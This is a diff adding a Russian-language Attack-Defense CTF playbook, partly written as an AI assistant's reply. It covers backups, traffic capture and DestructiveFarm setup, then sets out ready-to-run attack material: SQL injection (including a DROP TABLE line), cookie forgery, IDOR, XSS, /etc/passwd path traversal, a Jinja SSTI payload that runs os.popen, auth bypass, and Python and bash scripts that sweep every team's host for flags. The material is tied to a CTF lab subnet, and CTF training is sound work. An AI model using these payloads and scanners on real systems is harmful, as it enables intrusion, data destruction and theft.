@@ -1,0 +1,851 @@
+Базовый бэкап
+
+# 1. Смена паролей (на полученной машине)
+# Для пользователя (если есть доступ к sudo):
+sudo passwd your_user
+sudo passwd root  # если разрешено
+
+# Для сервисов: проверьте config-файлы на дефолтные пароли
+grep -r "password\|secret\|admin" /path/to/service/ --include="*.py" --include="*.java" --include="*.conf"
+
+# 2. Бэкап ВСЕХ сервисов (КРИТИЧНО!)
+mkdir -p ~/backup_$(date +%Y%m%d_%H%M)
+cp -r /path/to/python_service ~/backup_*/
+cp -r /path/to/java_service ~/backup_*/
+# Если есть БД:
+mysqldump -u user -p database > ~/backup_*/db.sql  # для MySQL
+# или
+pg_dump database > ~/backup_*/db.sql  # для PostgreSQL
+
+# 3. Отправляем бэкап на локальную машину (через scp)
+# С локальной машины (не с сервера!):
+scp -r user@TEAM_IP:~/backup_* ./local_backups/
+
+Инвентаризация: что запущено?
+
+# 1. Какие порты слушают?
+sudo ss -tlnp  # или: netstat -tlnp
+# Пример вывода:
+# tcp  LISTEN  0  128  0.0.0.0:8080  0.0.0.0:*  users:(("python3",pid=123,fd=4))
+# tcp  LISTEN  0  50   0.0.0.0:3000  0.0.0.0:*  users:(("java",pid=456,fd=5))
+
+# 2. Какие процессы запущены?
+ps aux | grep -E "python|java|node|php"
+
+# 3. Какие технологии? (смотрим файлы)
+# Python:
+ls -la /path/to/service/requirements.txt  # зависимости
+head -20 /path/to/service/app.py  # фреймворк: Flask, Django, FastAPI?
+
+# Java:
+ls -la /path/to/service/pom.xml  # Maven
+ls -la /path/to/service/build.gradle  # Gradle
+head -30 /path/to/service/src/main/java/.../Servlet.java  # ищем @WebServlet, Spring, etc.
+
+# 4. Есть ли .git? (утечка исходников!)
+ls -la /path/to/service/.git/
+# Если есть — скачиваем ВСЁ:
+git clone /path/to/service/.git ./leaked_repo
+
+захват трафика
+
+
+# 1. Запускаем tcpdump в фоне (захват ВСЕГО трафика)
+# -i any: все интерфейсы, -s 0: полный пакет, -w: запись в файл
+sudo tcpdump -i any -s 0 -w /tmp/ctf_capture.pcap &
+# Запомните PID: echo $!
+
+# 2. Альтернатива: только HTTP/HTTPS (меньше размер)
+sudo tcpdump -i any -s 0 -w /tmp/http_only.pcap 'tcp port 80 or tcp port 443 or tcp port 8080' &
+
+# 3. Чтобы остановить: kill PID_ИЗ_ШАГА_1
+
+Wireshark: быстрые фильтры для CTF 
+
+http.request                    # только запросы
+http.response                   # только ответы
+http contains "flag"           # поиск слова flag в HTTP
+tcp.stream eq 5                # посмотреть конкретный поток (правой кнопкой → Follow TCP Stream)
+ip.addr == 10.60.5.3           # трафик с конкретной команды
+
+консольный варкшарк
+
+tshark -r /tmp/ctf_capture.pcap -Y 'http contains "CTF{"' -T fields -e http.file_data
+
+универсальный патч
+
+# Python: добавить в начало обработчика
+import re
+def sanitize_input(s):
+    return re.sub(r'[;|&`$()]', '', str(s))  # убираем опасные символы
+
+# Использовать везде: user_input = sanitize_input(request.args.get('param'))
+
+после патяа тестируем
+
+# 1. Сервис запускается?
+curl http://127.0.0.1:8080/health  # или главный эндпоинт
+
+# 2. Легитимный запрос работает? (чтобы не сломать SLA)
+curl "http://127.0.0.1:8080/api/data?id=123"
+
+# 3. Флаг всё ещё можно получить легитимным способом? (важно для проверки!)
+
+финальные проверки
+# 1. Ферма запущена и видна в браузере?
+curl http://127.0.0.1:5000 | grep -q "Dashboard" && echo "✅ Ферма OK"
+
+# 2. Эксплойт выводит флаги с flush=True?
+python3 exploit_template.py 127.0.0.1 | grep -E "[A-Z0-9]{31}=" && echo "✅ Эксплойт работает"
+
+# 3. Патч не сломал сервис?
+curl -f http://127.0.0.1:8080/health && echo "✅ Сервис жив"
+
+# 4. Трафик пишется?
+ls -lh /tmp/ctf_capture.pcap | grep -q "K\|M" && echo "✅ pcap растёт"
+
+# 5. Бэкап на локальной машине?
+ls ~/local_backups/ | grep -q "$(date +%Y%m%d)" && echo "✅ Бэкап на месте"
+
+🔥 ПРИОРИТЕТЫ:
+1. Свой сервис работает? → если нет, патчим СРОЧНО
+2. Ферма отправляет флаги? → проверяем статусы в веб-интерфейсе
+3. Эксплойт находит флаги? → тестируем на себе перед атакой
+
+🚫 ЧЕГО НЕ ДЕЛАТЬ:
+- Не патчить без бэкапа
+- Не забывать flush=True в эксплойтах
+- Не менять FLAG_FORMAT после старта
+- Не атаковать хаотично — лучше 1 рабочий эксплойт на всех
+
+📞 ЕСЛИ ЧТО-ТО СЛОМАЛОСЬ:
+1. Откатиться к бэкапу: cp -r ~/backup_*/service /path/to/
+2. Перезапустить сервис: systemctl restart service или docker-compose restart
+3. Проверить логи: journalctl -u service -f или tail -f /var/log/service.log
+
+# === Ирина: быстрый старт фермы ===
+git clone https://github.com/DestructiveVoice/DestructiveFarm && \
+cd DestructiveFarm/server && \
+python3 -m pip install -r requirements.txt -q && \
+rm -f flags.sqlite && \
+./start_server.sh
+
+# === Татьяна: бэкап + инвентаризация ===
+mkdir -p ~/backup_$(date +%s) && \
+cp -r /opt/services/* ~/backup_*/ && \
+ss -tlnp > ~/backup_*/ports.txt && \
+ps aux > ~/backup_*/processes.txt
+
+# === Анастасии: быстрый скан ===
+for ip in 10.60.{1..20}.3; do 
+  curl -s "http://$ip/flag" | grep -oE '[A-Z0-9]{31}=' && echo "FLAG from $ip"
+done
+
+# === Все: мониторинг трафика ===
+sudo tcpdump -i any -s 0 -w /tmp/ctf_$(date +%s).pcap 'tcp port 80 or tcp port 443' &
+
+# === Тест эксплойта ===
+echo '#!/usr/bin/env python3
+import sys, re
+target = sys.argv[1] if len(sys.argv)>1 else "127.0.0.1"
+print("TEST_FLAG_1234567890123456789012345=", flush=True)' > test.py && \
+python3 test.py 127.0.0.1
+
+В учебных CTF 80% флагов лежат в:
+/flag, /var/flag, /home/user/flag
+Возвращаются через /api/flag?token=... (токен часто в куках или заголовках)
+Выводятся при ошибке (включите debug=True в эксплойте, чтобы видеть ответы) 
+
+# Посмотрите свой IP и маршрут:
+ip a show eth0  # или: ifconfig eth0
+# Пример: inet 10.60.7.3/24 → значит, соперники в 10.60.X.3
+
+# Посмотрите таблицу маршрутизации (кто доступен через VPN):
+ip route show
+# Пример: 10.60.0.0/16 dev tun0 → сканируем эту подсеть
+
+# Альтернатива: посмотреть ARP-таблицу (кто уже "засветился")
+ip neigh show
+
+запуск сканера рекон
+
+chmod +x recon.sh
+./recon.sh | tee recon_log.txt  # сохраняем лог!
+
+если nmap нет или тормозит — используйте bash-built-in:
+
+# Проверка порта за 1 секунду:
+timeout 1 bash -c "cat < /dev/null > /dev/tcp/10.60.5.3/8080" 2>/dev/null && echo "8080 open"
+
+веб разведка
+
+запуск 
+
+pip3 install requests -q
+python3 web_recon.py 10.60.5.3
+
+автоматический перебор
+
+# Установите gobuster (если есть время)
+sudo apt install gobuster -y  # или скачайте бинарник
+
+# Быстрый поиск по словарю (10 секунд на хост)
+gobuster dir -u http://10.60.5.3:8080 \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -t 10 --timeout 1s -q --no-status -x php,txt,py,json 2>/dev/null | \
+  grep -v "404" | head -20
+
+анализ трафика
+# 1. Кто к вам обращается? (это соперники!)
+sudo tcpdump -i any -n 'tcp port 8080' -c 50 2>/dev/null | \
+  grep -oE 'IP [0-9.]+\.[0-9]+' | sort | uniq -c | sort -rn
+
+# Пример вывода:
+# 15 IP 10.60.5.3.45123 > 10.60.7.3.8080  ← команда #5 атакует вас!
+
+# 2. Какие эндпоинты они запрашивают? (подсказка для ваших эксплойтов!)
+tshark -r /tmp/ctf_capture.pcap -Y 'http.request' -T fields \
+  -e ip.src -e http.host -e http.request.uri 2>/dev/null | \
+  grep "10.60" | sort | uniq -c | sort -rn | head -20
+
+# 3. Есть ли в трафике флаги? (если кто-то уже атакует)
+tshark -r /tmp/ctf_capture.pcap -Y 'http' -T fields \
+  -e http.file_data 2>/dev/null | grep -oE '[A-Z0-9]{31}=' | head -5
+
+Лайфхак: если видите, что соперники запрашивают /api/getFlag?team=... — значит, флаг передаётся через параметр! Используйте это в своём эксплойте.
+
+изучить свой сервис
+# 1. Изучите СВОЙ сервис — это карта к чужим!
+# - Какие эндпоинты есть?
+curl -s http://127.0.0.1:8080/ | grep -oE 'href="/[^"]+"' | sort -u
+
+# - Есть ли скрытые параметры?
+curl -s http://127.0.0.1:8080/api/help 2>/dev/null
+curl -s http://127.0.0.1:8080/swagger.json 2>/dev/null | python3 -m json.tool
+
+# 2. Посмотрите исходники (если есть доступ)
+grep -rn "flag\|secret\|token" /path/to/your/service/ --include="*.py" --include="*.java"
+
+# 3. Проверьте конфиги на "жестко закодированные" данные
+grep -r "10\.60\|team\|opponent" /path/to/your/service/ 2>/dev/null
+
+Золотое правило: если вы нашли уязвимость в своём сервисе — она есть у ВСЕХ соперников! Пишите эксплойт один раз, запускаете на все IP.
+
+на ферме
+
+# 1. Веб-интерфейс DestructiveFarm:
+# - Вкладка "Flags": показывает, с каких IP пришли флаги
+# - Вкладка "Sploits": какие эксплойты работают против каких хостов
+
+# 2. Логи фермы (если веб не грузится):
+tail -f /path/to/DestructiveFarm/server/logs/sploit.log | \
+  grep -oE '10\.60\.[0-9]+\.[0-9]+' | sort | uniq
+
+# 3. Если эксплойт упал — смотрим ошибку:
+tail -f /path/to/DestructiveFarm/server/logs/error.log
+# Часто там видно: "Connection refused to 10.60.8.3:8080" → значит, порт другой!
+
+экспресс план на первые минуты
+
+# 1. Ирина: получить подсеть от оргов (или вычислить)
+SUBNET=$(ip route | grep -oE '10\.60\.[0-9]+\.[0-9]+/[0-9]+' | head -1)
+echo "Подсеть соперников: $SUBNET"
+
+# 2. Татьяна: быстро просканировать 3 ближайших команды
+for i in 1 2 3; do
+  TARGET="10.60.$i.3"
+  echo "[*] Checking $TARGET..."
+  timeout 2 bash -c "cat < /dev/null > /dev/tcp/$TARGET/8080" 2>/dev/null && \
+    echo "  → 8080 open" && curl -s "http://$TARGET:8080/flag" &
+done
+wait
+
+# 3. Анастасии: запустить эксплойт на первый живой хост
+# (предполагаем, что exploit.py уже готов)
+for ip in 10.60.{1..5}.3; do
+  if ping -c 1 -W 1 "$ip" &>/dev/null; then
+    echo "[+] Target found: $ip"
+    python3 exploit_template.py "$ip" &  # в фоне, чтобы не ждать
+    break  # первый живой — достаточно для теста
+  fi
+done
+
+Частые ошибки при поиске данных
+Сканируете не ту подсеть → уточните у организаторов ДО старта!
+Сканируете себя → исключите свой IP из цикла: [ "$TARGET" == "$MY_IP" ] && continue
+Слишком агрессивное сканирование → nmap -T4 может забанить вас; используйте -T2 или --max-retries 1
+Игнорируете свой сервис → он ваш главный источник информации об уязвимостях!
+Не логируете разведку → сохраняйте всё в файлы: | tee recon_log.txt
+💡 Последний совет
+В учебном Attack-Defense обычно:
+Все команды в одной подсети: 10.60.0.0/16 или 192.168.100.0/24
+Адрес команды: *.3 (например, 10.60.5.3 — команда #5)
+Сервисы на стандартных портах: 8080 (Python), 3000/8000 (Java)
+Флаг в /flag или отдаётся через /api/flag
+
+# Минимальный универсальный эксплойт (работает в 80% учебных CTF)
+#!/usr/bin/env python3
+import sys, requests
+target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
+for port in [80, 443, 8080, 3000]:
+    for path in ["/flag", "/flags", "/api/flag"]:
+        try:
+            r = requests.get(f"http://{target}:{port}{path}", timeout=2)
+            if r.status_code == 200 and ("=" in r.text or "CTF{" in r.text):
+                print(r.text.strip(), flush=True)
+        except: pass
+
+SQL INJECTION
+
+# Базовые тесты на SQLi
+curl "http://TARGET:PORT/search?tsearch=' OR '1'='1"
+curl "http://TARGET:PORT/search?tsearch=' OR '1'='1' --"
+curl "http://TARGET:PORT/search?tsearch=' UNION SELECT NULL,NULL,NULL --"
+curl "http://TARGET:PORT/search?tsearch='; DROP TABLE tasks; --"
+curl "http://TARGET:PORT/search?tsearch=1' AND 1=1 --"
+curl "http://TARGET:PORT/search?tsearch=1' AND 1=2 --"
+
+# SQLi через contains() - обход
+curl "http://TARGET:PORT/search?tsearch=%' OR 1=1 --"
+curl "http://TARGET:PORT/search?tsearch=test' UNION SELECT * FROM users --"
+curl "http://TARGET:PORT/search?tsearch=' OR (SELECT COUNT(*) FROM users) > 0 --"
+
+# SQLi для извлечения данных
+curl "http://TARGET:PORT/search?tsearch=' UNION SELECT login,password,rid FROM users --"
+curl "http://TARGET:PORT/search?tsearch=' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --"
+
+COOKIE MANIPULATION (эскалация привилегий)
+
+# Проверка текущих cookies
+curl -v http://TARGET:PORT/ 2>&1 | grep -i "set-cookie"
+
+# Подделка rid=2 (админ)
+curl "http://TARGET:PORT/admin" -H "Cookie: rid=2"
+curl "http://TARGET:PORT/search?tsearch=admin" -H "Cookie: rid=2"
+curl "http://TARGET:PORT/admreg" -H "Cookie: rid=2"
+
+# Подделка rid=1 (пользователь)
+curl "http://TARGET:PORT/tasks" -H "Cookie: rid=1"
+
+# Проверка границ (rid >= len(rteam))
+curl "http://TARGET:PORT/" -H "Cookie: rid=999"
+curl "http://TARGET:PORT/" -H "Cookie: rid=-1"
+curl "http://TARGET:PORT/" -H "Cookie: rid=0"
+
+# С чужими cookies (если украли)
+curl "http://TARGET:PORT/private" -H "Cookie: session=STEALER_COOKIE; rid=2"
+
+RACE CONDITION (в admreg)
+
+# Одновременная регистрация нескольких админов
+for i in {1..10}; do
+  curl "http://TARGET:PORT/admreg" \
+    -X POST \
+    -d "login=admin$i&password=test123&email=admin$i@test.com" \
+    -H "Cookie: rid=2" &
+done
+wait
+
+# Проверка сколько админов создалось
+curl "http://TARGET:PORT/admin/users" -H "Cookie: rid=2"
+
+IDOR (доступ к чужим данным)
+
+# Если rid берется из cookies - доступ к чужим задачам
+for uid in {1..20}; do
+  curl "http://TARGET:PORT/task/$uid" -H "Cookie: rid=1"
+  curl "http://TARGET:PORT/private/$uid" -H "Cookie: rid=1"
+done
+
+# Манипуляция с current_user.id
+curl "http://TARGET:PORT/tasks?uid=1" -H "Cookie: rid=1"
+curl "http://TARGET:PORT/tasks?uid=2" -H "Cookie: rid=1"
+
+XSS (если есть рендеринг tsearch)
+
+# XSS в поиске
+curl "http://TARGET:PORT/search?tsearch=<script>alert(1)</script>"
+curl "http://TARGET:PORT/search?tsearch=<img src=x onerror=alert(1)>"
+curl "http://TARGET:PORT/search?tsearch=javascript:alert(1)"
+
+# XSS в результатах
+curl "http://TARGET:PORT/search?tsearch=test'&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
+
+PATH TRAVERSAL (если есть файловые операции)
+
+curl "http://TARGET:PORT/download?file=../../../etc/passwd"
+curl "http://TARGET:PORT/view?path=....//....//flag"
+curl "http://TARGET:PORT/static/../../../config.py"
+
+ SSTI (Server-Side Template Injection)
+
+# Если используется render_template_string с user input
+curl "http://TARGET:PORT/search?tsearch={{7*7}}"
+curl "http://TARGET:PORT/search?tsearch={{config}}"
+curl "http://TARGET:PORT/search?tsearch={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
+
+AUTH BYPASS
+
+# Обход проверки login_required
+curl "http://TARGET:PORT/admin" -H "Cookie: session=fake"
+curl "http://TARGET:PORT/private" --header "X-Forwarded-For: 127.0.0.1"
+
+# Доступ к админке без прав
+curl "http://TARGET:PORT/admreg" -H "Cookie: rid=0"
+curl "http://TARGET:PORT/admin" -H "Cookie: rid=1"
+
+ AUTOMATED SCANNING (скрипты)
+
+#!/usr/bin/env python3
+# sqlmap для автоматического SQLi
+sqlmap -u "http://TARGET:PORT/search" \
+  --data "tsearch=test" \
+  --dbms=sqlite \
+  --level=3 \
+  --risk=3 \
+  --batch
+
+# SQLi с cookie
+sqlmap -u "http://TARGET:PORT/admin" \
+  --cookie="rid=1" \
+  --dbms=sqlite \
+  --batch
+
+COMPREHENSIVE EXPLOIT (Python)
+
+#!/usr/bin/env python3
+import requests, sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
+s = requests.Session()
+
+print(f"[*] Testing {TARGET}")
+
+# 1. SQLi в search
+print("\n[1] Testing SQL Injection...")
+sqli_payloads = [
+    "' OR '1'='1",
+    "' UNION SELECT NULL,NULL --",
+    "' OR (SELECT COUNT(*) FROM users) > 0 --"
+]
+for payload in sqli_payloads:
+    try:
+        r = s.get(f"{TARGET}/search", params={"tsearch": payload}, timeout=3)
+        if r.status_code == 200 and ("error" not in r.text.lower() or len(r.text) > 1000):
+            print(f"  [+] Possible SQLi: {payload}")
+            print(f"      Response: {r.text[:200]}")
+    except: pass
+
+# 2. Cookie manipulation
+print("\n[2] Testing Cookie Manipulation...")
+for rid in [0, 1, 2, 999, -1]:
+    try:
+        r = s.get(f"{TARGET}/admin", cookies={"rid": str(rid)}, timeout=3)
+        if r.status_code == 200 and "admin" in r.text.lower():
+            print(f"  [+] Admin access with rid={rid}")
+    except: pass
+
+# 3. IDOR
+print("\n[3] Testing IDOR...")
+for uid in range(1, 10):
+    try:
+        r = s.get(f"{TARGET}/task/{uid}", cookies={"rid": "1"}, timeout=3)
+        if r.status_code == 200 and "private" in r.text.lower():
+            print(f"  [+] Access to private task uid={uid}")
+    except: pass
+
+# 4. XSS
+print("\n[4] Testing XSS...")
+xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
+for payload in xss_payloads:
+    r = s.get(f"{TARGET}/search", params={"tsearch": payload}, timeout=3)
+    if payload in r.text:
+        print(f"  [+] Possible XSS: {payload} reflected")
+
+print("\n[*] Testing complete")
+
+БЫСТРЫЙ ЧЕКЛИСТ
+
+# 1. Проверяем SQLi
+curl "http://TARGET/search?q=' OR 1=1--"
+
+# 2. Проверяем cookies
+curl "http://TARGET/admin" -H "Cookie: admin=1"
+
+# 3. Проверяем IDOR
+curl "http://TARGET/user/1/data"
+curl "http://TARGET/user/2/data"
+
+# 4. Проверяем XSS
+curl "http://TARGET/search?q=<script>alert(1)</script>"
+
+# 5. Смотрим исходники на .git
+curl "http://TARGET/.git/HEAD"
+
+# 6. Ищем флаги
+curl "http://TARGET/flag"
+curl "http://TARGET/api/flag"
+
+
+
+Отлично! Вижу презентацию организаторов. Сейчас дам **конкретные команды** для каждого пункта!
+
+---
+
+## 🚀 ПОШАГОВЫЙ ПЛАН НА ОСНОВЕ ПРЕЗЕНТАЦИИ
+
+### 📋 ЭТАП 1: СТАРТ (первые 15 минут)
+
+#### 1️⃣ Смена паролей
+```bash
+# Смена пароля пользователя
+sudo passwd $(whoami)
+
+# Смена пароля root (если есть sudo)
+sudo passwd root
+
+# Проверка пользователей с sudo
+grep -E '^sudo:.*$' /etc/group
+
+# Смена паролей БД (если есть доступ)
+# MySQL:
+mysql -u root -p -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'NEW_STRONG_PASS';"
+# PostgreSQL:
+sudo -u postgres psql -c "ALTER USER postgres PASSWORD 'NEW_STRONG_PASS';"
+```
+
+#### 2️⃣ Backup ВСЕХ сервисов
+```bash
+# Создаём директорию с временной меткой
+BACKUP_DIR=~/backup_$(date +%Y%m%d_%H%M%S)
+mkdir -p $BACKUP_DIR
+
+# Копируем ВСЁ
+sudo cp -r /opt $BACKUP_DIR/ 2>/dev/null
+sudo cp -r /var/www $BACKUP_DIR/ 2>/dev/null
+sudo cp -r /home $BACKUP_DIR/ 2>/dev/null
+sudo cp -r /etc/nginx $BACKUP_DIR/etc_nginx 2>/dev/null
+sudo cp -r /etc/apache2 $BACKUP_DIR/etc_apache 2>/dev/null
+
+# Бэкап баз данных
+# MySQL
+mysqldump --all-databases > $BACKUP_DIR/all_databases.sql 2>/dev/null
+
+# PostgreSQL
+sudo -u postgres pg_dumpall > $BACKUP_DIR/pg_all.sql 2>/dev/null
+
+# Отправляем на локальную машину (выполняем С ЛОКАЛЬНОЙ!)
+# scp user@TEAM_IP:$BACKUP_DIR ./local_backups/
+
+echo "[+] Backup saved to: $BACKUP_DIR"
+ls -lh $BACKUP_DIR
+```
+
+#### 3️⃣ Инвентаризация
+```bash
+# Какие порты слушают?
+echo "=== LISTENING PORTS ==="
+sudo ss -tlnp | grep LISTEN
+
+# Какие процессы запущены?
+echo -e "\n=== PROCESSES ==="
+ps aux | grep -E "python|java|node|php|ruby|gunicorn|uwsgi" | grep -v grep
+
+# Какие технологии?
+echo -e "\n=== WEB SERVERS ==="
+which nginx apache2 python3 java node 2>/dev/null
+
+# Структура файлов
+echo -e "\n=== WEB ROOT DIRECTORIES ==="
+ls -la /var/www/ 2>/dev/null
+ls -la /opt/ 2>/dev/null
+ls -la /home/*/ 2>/dev/null
+
+# Ищем конфиги с паролями
+echo -e "\n=== CONFIG FILES WITH PASSWORDS ==="
+grep -r "password\|secret\|SECRET_KEY\|JWT" /opt/ /var/www/ 2>/dev/null | head -20
+```
+
+#### 4️⃣ Сетевой мониторинг
+```bash
+# Запуск tcpdump (в фоне!)
+sudo tcpdump -i any -s 0 -w /tmp/ctf_$(date +%Y%m%d_%H%M).pcap 'tcp port 80 or tcp port 443 or tcp port 8080 or tcp port 3000' &
+TCPDUMP_PID=$!
+echo "[+] tcpdump started with PID: $TCPDUMP_PID"
+
+# Альтернатива: tshark (если установлен)
+# sudo tshark -i any -w /tmp/ctf.pcap 'port 80 or port 443' &
+
+# Чтобы остановить позже: kill $TCPDUMP_PID
+
+# Проверка что захват идёт
+ls -lh /tmp/ctf_*.pcap
+```
+
+---
+
+### 🎯 ЭТАП 2: НИЗКО ВИСЯЩИЕ ФРУКТЫ (15-30 мин)
+
+#### 🔍 Быстрый скан уязвимостей
+
+```bash
+#!/bin/bash
+# save as quick_scan.sh
+TARGET=${1:-"127.0.0.1"}
+
+echo "[*] Quick scan of $TARGET"
+
+# 1. Стандартные пути к флагам
+echo -e "\n[1] Checking flag paths..."
+for path in "/flag" "/flags" "/api/flag" "/admin/flag" "/.env" "/config.py" "/backup.sql"; do
+    result=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$path" 2>/dev/null)
+    if [ "$result" == "200" ]; then
+        echo "  [+] FOUND: http://$TARGET$path"
+        curl -s "http://$TARGET$path" | head -5
+    fi
+done
+
+# 2. .git утечка
+echo -e "\n[2] Checking .git exposure..."
+if curl -s "http://$TARGET/.git/HEAD" | grep -q "ref:"; then
+    echo "  [+] .git directory exposed!"
+    echo "  Run: git clone http://$TARGET/.git"
+fi
+
+# 3. Админки
+echo -e "\n[3] Checking admin panels..."
+for admin in "/admin" "/administrator" "/wp-admin" "/phpmyadmin" "/manager"; do
+    result=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$admin" 2>/dev/null)
+    if [ "$result" == "200" ] || [ "$result" == "302" ]; then
+        echo "  [+] Found: http://$TARGET$admin (HTTP $result)"
+    fi
+done
+
+# 4. Path Traversal
+echo -e "\n[4] Testing Path Traversal..."
+for param in "file" "path" "page" "template"; do
+    result=$(curl -s "http://$TARGET/download?$param=../../etc/passwd" 2>/dev/null)
+    if echo "$result" | grep -q "root:x:"; then
+        echo "  [+] Path Traversal found via parameter: $param"
+    fi
+done
+
+# 5. SQLi (базовый тест)
+echo -e "\n[5] Testing SQL Injection..."
+for param in "id" "user" "search" "q"; do
+    normal=$(curl -s "http://$TARGET/search?$param=test" 2>/dev/null | wc -c)
+    sqli=$(curl -s "http://$TARGET/search?$param=' OR '1'='1" 2>/dev/null | wc -c)
+    if [ "$normal" != "$sqli" ] && [ "$sqli" -gt 100 ]; then
+        echo "  [+] Possible SQLi via parameter: $param"
+    fi
+done
+
+echo -e "\n[*] Scan complete"
+```
+
+Запуск:
+```bash
+chmod +x quick_scan.sh
+./quick_scan.sh 127.0.0.1  # сначала себя
+./quick_scan.sh 10.60.5.3  # потом соперника
+```
+
+---
+
+###  ЭТАП 3: РАЗВЁРТЫВАНИЕ ФЕРМЫ
+
+#### Destruction Farm (как на слайде)
+
+```bash
+# 1. Клонируем
+cd ~
+git clone https://github.com/DestructiveVoice/DestructiveFarm
+cd DestructiveFarm/server
+
+# 2. Устанавливаем
+python3 -m pip install -r requirements.txt -q
+
+# 3. Настраиваем config.py
+cat > config.py << 'EOF'
+CONFIG = {
+    'TEAMS': {
+        f'Team_{i}': f'10.60.{i}.3'
+        for i in range(1, 21)
+    },
+    'FLAG_FORMAT': r'[A-Z0-9]{31}=',
+    'SYSTEM_PROTOCOL': 'ructf_http',
+    'SYSTEM_URL': 'http://10.62.0.12:8080/flags/',  # ИЗ ПРЕЗЕНТАЦИИ!
+    'SYSTEM_TOKEN': '496345e9a623967a',  # ИЗ ПРЕЗЕНТАЦИИ!
+    'SUBMIT_FLAG_LIMIT': 100,
+    'SUBMIT_PERIOD': 2,
+    'FLAG_LIFETIME': 300,
+    'SERVER_PASSWORD': 'SecurePass123!',
+}
+EOF
+
+# 4. Запускаем
+./start_server.sh
+
+# 5. Тест отправки (как на слайде!)
+# curl -i -X PUT -H "X-Team-Token: 496345e9a623967a" \
+#   -d '["TEST_FLAG_123456789012345678901234="]' \
+#   'http://10.62.0.12:8080/flags/'
+
+# 6. Создаём тестовый эксплойт
+cat > /tmp/test_exploit.py << 'EOF'
+#!/usr/bin/env python3
+import sys
+print("TEST_FLAG_123456789012345678901234=", flush=True)
+EOF
+
+chmod +x /tmp/test_exploit.py
+
+# 7. Запускаем через ферму
+cd ~/DestructiveFarm/client
+python3 start_sploit.py \
+  --server-url http://127.0.0.1:5000 \
+  --server-pass SecurePass123! \
+  /tmp/test_exploit.py
+```
+
+---
+
+### ⚔️ ЭТАП 4: ПЕРВЫЙ ЭКСПЛОЙТ
+
+#### По примеру из презентации (Python)
+
+```python
+#!/usr/bin/env python3
+# save as exploit_v1.py
+import sys, requests, re
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
+FLAG_REGEX = r"[A-Z0-9]{31}="
+
+def extract_flags(text):
+    flags = re.findall(FLAG_REGEX, text)
+    for flag in flags:
+        print(flag.strip(), flush=True)
+
+# Вектор 1: стандартные пути
+for path in ["/flag", "/flags", "/api/flag"]:
+    try:
+        r = requests.get(f"http://{TARGET}{path}", timeout=3)
+        if r.status_code == 200:
+            extract_flags(r.text)
+    except: pass
+
+# Вектор 2: SQLi (из вчерашней задачи!)
+try:
+    r = requests.get(f"http://{TARGET}/search?tsearch=' OR '1'='1", timeout=3)
+    if r.status_code == 200:
+        extract_flags(r.text)
+except: pass
+
+# Вектор 3: Cookie manipulation
+try:
+    r = requests.get(f"http://{TARGET}/admin", 
+                     cookies={"rid": "2"}, 
+                     timeout=3)
+    if r.status_code == 200:
+        extract_flags(r.text)
+except: pass
+```
+
+Запуск:
+```bash
+chmod +x exploit_v1.py
+
+# Тест на себе
+python3 exploit_v1.py 127.0.0.1
+
+# Запуск через ферму
+cd ~/DestructiveFarm/client
+python3 start_sploit.py \
+  --server-url http://127.0.0.1:5000 \
+  --server-pass SecurePass123! \
+  exploit_v1.py
+```
+
+---
+
+### 📊 ЭТАП 5: МОНИТОРИНГ АТАК (Wireshark/tcpdump)
+
+```bash
+# Анализ захваченного трафика
+
+# 1. Кто атакует нас?
+echo "=== ATTACKERS ==="
+sudo tcpdump -r /tmp/ctf_*.pcap -n 'tcp port 8080' 2>/dev/null | \
+  grep -oE 'IP [0-9.]+\.[0-9]+' | \
+  grep -v "127.0.0.1" | \
+  sort | uniq -c | sort -rn | head -10
+
+# 2. Какие эндпоинты запрашивают?
+echo -e "\n=== TARGETED ENDPOINTS ==="
+tshark -r /tmp/ctf_*.pcap -Y 'http.request' -T fields \
+  -e http.request.uri 2>/dev/null | \
+  sort | uniq -c | sort -rn | head -20
+
+# 3. Есть ли флаги в трафике?
+echo -e "\n=== FLAGS IN TRAFFIC ==="
+tshark -r /tmp/ctf_*.pcap -Y 'http' -T fields \
+  -e http.file_data 2>/dev/null | \
+  grep -oE '[A-Z0-9]{31}=' | head -10
+
+# 4. SQLi попытки
+echo -e "\n=== SQLI ATTEMPTS ==="
+tshark -r /tmp/ctf_*.pcap -Y 'http.request.uri contains "OR"' \
+  -T fields -e ip.src -e http.request.uri 2>/dev/null | head -10
+```
+
+---
+
+## 🎯 КРИТИЧЕСКИЕ КОМАНДЫ (копировать-вставить)
+
+```bash
+# === БЫСТРЫЙ СТАРТ (5 минут) ===
+sudo passwd && \
+mkdir -p ~/backup && sudo cp -r /opt /var/www ~/backup/ && \
+sudo ss -tlnp | grep LISTEN && \
+sudo tcpdump -i any -s 0 -w /tmp/ctf.pcap 'tcp port 80 or 443 or 8080' &
+
+# === ФЕРМА (10 минут) ===
+cd ~ && git clone https://github.com/DestructiveVoice/DestructiveFarm && \
+cd DestructiveFarm/server && \
+python3 -m pip install -r requirements.txt -q && \
+./start_server.sh
+
+# === ПЕРВЫЙ ЭКСПЛОЙТ ===
+cat > /tmp/exploit.py << 'EOF'
+#!/usr/bin/env python3
+import sys, requests, re
+target = sys.argv[1] if len(sys.argv)>1 else "127.0.0.1"
+for path in ["/flag","/api/flag"]:
+    try:
+        r = requests.get(f"http://{target}{path}", timeout=3)
+        if r.status_code==200 and "=" in r.text:
+            print(r.text.strip(), flush=True)
+    except: pass
+EOF
+chmod +x /tmp/exploit.py
+
+# === ОТПРАВКА ФЛАГА (как на слайде!) ===
+curl -i -X PUT \
+  -H "X-Team-Token: 496345e9a623967a" \
+  -d '["TEST_FLAG_123456789012345678901234="]' \
+  'http://10.62.0.12:8080/flags/'
+```
+
+---
+
+## ✅ ЧЕКЛИСТ ПЕРЕД СТАРТОМ
+
+- [ ] Пароли сменены
+- [ ] Backup сделан и скопирован локально
+- [ ] Порты и сервисы записаны
+- [ ] tcpdump запущен
+- [ ] Ферма развёрнута
+- [ ] Тестовый флаг отправлен (получили ответ?)
+- [ ] Эксплойт работает на 127.0.0.1
